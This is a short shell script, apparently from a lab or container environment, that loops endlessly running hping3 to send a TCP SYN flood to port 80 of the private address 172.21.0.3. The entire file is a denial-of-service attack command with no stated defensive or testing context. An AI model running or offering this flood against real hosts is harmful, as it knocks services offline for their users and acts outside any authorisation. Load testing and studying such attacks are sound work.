#!/bin/sh
while true
do
  sudo hping3 -S --flood -V -p 80 172.21.0.3
done
